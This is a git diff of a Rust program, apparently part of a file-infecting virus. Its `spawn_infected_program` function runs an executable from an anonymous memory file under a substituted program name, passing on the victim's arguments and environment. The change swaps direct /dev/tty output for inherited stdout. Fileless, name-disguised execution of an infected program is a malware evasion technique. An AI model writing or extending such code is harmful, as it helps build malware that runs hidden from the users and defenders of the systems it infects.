@@ -1,15 +1,12 @@
 use clap::Parser;
-use memfd_exec::{Child, MemFdExecutable, Stdio, AnonPipe};
+use memfd_exec::{Child, MemFdExecutable, Stdio};
 use std::env::{self, args, current_exe, vars};
 use std::ffi::OsStr;
-use std::os::fd::FromRawFd;
 use std::fs::{File, read};
 use std::io::{Read, Write};
-use std::os::fd::IntoRawFd;
 use std::os::unix::fs::PermissionsExt;
 use std::time::{Duration, Instant};
 use std::thread::sleep;
-use std::fs::OpenOptions;
 
 #[derive(Parser, Debug)]
 struct Args {
@@ -100,17 +97,14 @@ pub fn spawn_infected_program() -> Result<(), Box<dyn std::error::Error>> {
     let argv: Vec<String> = args().collect();
     let env: Vec<(String, String)> = vars().collect();
     let mut exec = MemFdExecutable::new(&argv[0], executable);
-    let stdout_file = OpenOptions::new().read(false).write(true).open("/dev/tty")?;
 
-    unsafe {
-        let stdout = AnonPipe::from_raw_fd(stdout_file.into_raw_fd());
-        exec
-            .envs(env)
-            .args(&argv[1..])
-            .stdout(Stdio::from(stdout))
-            .set_program(OsStr::new(SL_OUTPUT_BINARY_NAME));
-        let _child : Child = exec.spawn()?;
-    }
+    exec
+        .envs(env)
+        .args(&argv[1..])
+        .stdout(Stdio::inherit())
+        .set_program(OsStr::new(SL_OUTPUT_BINARY_NAME));
+
+    let _child : Child = exec.spawn()?;
     Ok(())
 }
 // IMPLEMENT FROM_RAW_FD FOR ChildStdout, should be a simple implementation from AnonPipe and up.
